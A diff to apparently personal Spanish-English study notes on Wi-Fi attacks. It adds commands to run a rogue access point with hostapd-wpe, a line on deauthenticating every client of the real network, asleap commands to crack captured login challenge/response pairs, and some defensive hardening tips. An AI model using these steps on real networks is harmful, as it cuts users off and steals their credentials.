@@ -294,8 +294,18 @@ hostapd-wpe.conf
 interface=(interface)
 ssid=(name of fake network)
 ```
+run the network
+```
+service network-manager stop
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+```
+now run a deautentification atak agenst all clients of real network  
 
-
+Cracking Login Credentials  
+```
+asleap --help
+asleap -C (Challenge) -R (Response) -W (Dictionary)
+```
 
 ## Evil Twin Attack
 dea:
@@ -518,7 +528,8 @@ usar wpa2 con contraseñas complejas
 asegurar que wps esta desabilitado  
 use 802.11w para protejerte de deautentificaciones
 usa WPA Enterprice envez de mac filtering
-
+Do not use captive portals. Use WPA/WPA2 enterprise instead.  
+Disable WPS.  
 obtenemos la ip del ordenador ifconfig wlan0 vamos a la ip 1 de la subnet para entrar en la pagina del router  
 si nos atacan con deautentificacion nos podemos conectar con el cable  
 Access Control podemos especificar que mac permitimos conectar a la red y cuales no  
